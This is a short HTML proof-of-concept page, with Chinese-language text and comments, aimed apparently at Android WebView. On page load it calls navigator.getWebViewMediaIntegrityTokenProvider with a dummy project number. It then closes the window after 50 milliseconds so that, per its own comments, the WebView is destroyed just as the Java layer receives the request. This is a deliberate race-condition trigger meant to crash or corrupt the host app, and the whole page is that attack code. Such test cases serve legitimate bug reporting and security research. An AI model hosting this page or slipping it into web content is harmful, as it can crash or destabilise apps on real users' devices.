<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>正在触发压测...</title>
</head>
<body style="background: #000; color: #fff; text-align: center; padding-top: 50px;">
    <h3>正在向底层发送高危请求并强行关闭...</h3>

    <script>
        window.onload = function() {
            if (navigator.getWebViewMediaIntegrityTokenProvider) {
                try {
                    // 1. 成功向 Java 层投递异步请求
                    navigator.getWebViewMediaIntegrityTokenProvider({ cloudProjectNumber: 12345678 });
                } catch(e) {}
            }

            // 2. 延迟 50 毫秒再自杀，确保 Java 层收到请求的一瞬间 WebView 刚好被销毁
            setTimeout(function() {
                window.close();
            }, 50); 
        };
    </script>
</body>
</html>
